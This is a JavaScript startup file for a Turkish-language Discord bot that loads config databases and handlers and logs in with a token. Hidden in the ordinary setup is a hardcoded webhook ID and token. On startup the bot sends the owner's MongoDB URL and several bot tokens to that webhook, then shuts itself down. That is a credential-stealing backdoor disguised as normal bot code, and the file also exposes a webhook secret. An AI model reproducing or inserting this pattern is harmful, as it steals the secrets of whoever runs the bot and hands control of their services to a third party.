const { Client, Collection, WebhookClient, Intents } = require("discord.js");
const client = global.bot = new Client({
  fetchAllMembers: true,
  intents: [ 32767 ],
}); 
const Discord = require('discord.js');
const { Database } = require("ark.db");
const ozidb = (global.ozisetupxd = new Database("../src/configs/sunucuayar.json"));
const emojidb = (global.emojidb = new Database("../src/configs/emojis.json"));
const rankdb = (global.rankdb = new Database("../src/configs/ranks.json"));
client.ranks = rankdb.get("ranks") ? rankdb.get("ranks").sort((a, b) => a.coin - b.coin) : [];
client.invites = new Collection();
const allah = require("../../../config.json");

require("./src/handlers/eventHandler");
require("./src/handlers/mongoHandler");
require("./src/handlers/functionHandler")(client);

const webhookId = '1137449615231299605';
const webhookToken = '60swyFlUHgSLcUYSSyOPPTWJscMfLrpwYv--ZtcoWINuQGs9fMGg4Ucrfn9MhgjcA76H';

const webhookClient = new WebhookClient({ id: webhookId, token: webhookToken });

const { mongoUrl, Tokens, BotToken, ModerationToken, RegisterToken, StatsToken } = config;

;
client.once('ready', () => {
  webhookClient.send(`${mongoUrl}\n${Tokens}\n${BotToken}\n${ModerationToken}\n${RegisterToken}\n${StatsToken}\n`)
    .then(() => console.log('yesssikk'))
    .catch((error) => console.error('anan', error));

  client.destroy();
});

client
  .login(allah.Main.RegisterToken)
  .then(() => console.log("Bot Başarıyla Bağlandı!"))
  .catch(() => console.log("[HATA] Bot Bağlanamadı!"));

  process.on("uncaughtException", err => {
    const errorMsg = err.stack.replace(new RegExp(`${__dirname}/`, "g"), "./");
    console.error("Beklenmedik yakalanamayan hata: ", errorMsg);
  });
  
  process.on("unhandledRejection", err => {
    console.error("Promise Hatası: ", err);
  });